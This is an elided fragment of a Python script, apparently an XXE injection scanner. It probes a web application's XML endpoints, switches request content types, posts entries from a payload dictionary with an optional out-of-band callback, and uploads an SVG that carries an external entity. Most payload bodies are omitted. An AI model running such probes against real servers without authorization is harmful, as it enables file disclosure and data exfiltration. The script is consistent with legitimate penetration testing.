...
def detect_xml_endpoints(base_url, token=None):
    ...
    for ep in endpoints:
        ...
        try:
            resp = requests.post(url, headers=headers, data=xml_test, timeout=10, verify=True)
...
def test_content_type_switch(base_url, endpoint, token=None):
    ...
    try:
        json_resp = requests.post(
            url, headers=json_headers, json={"search": "test"}, timeout=10, verify=True
        )
    ...
    for name, payload in XXE_PAYLOADS.items():
        if "{callback}" in payload:
            if callback:
                ...
                continue
        try:
            resp = requests.post(url, headers=headers, data=payload, timeout=15, verify=True)
...
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
    ...
    try:
        ...
        resp = requests.post(url, headers=headers, files=files, timeout=15, verify=True)
...
def main():
    ...
    for ep in xml_eps:
        if ep["endpoint"] != args.endpoint:
            findings.extend(
                test_xxe_payloads(args.base_url, ep["endpoint"], args.token, args.callback)
            )
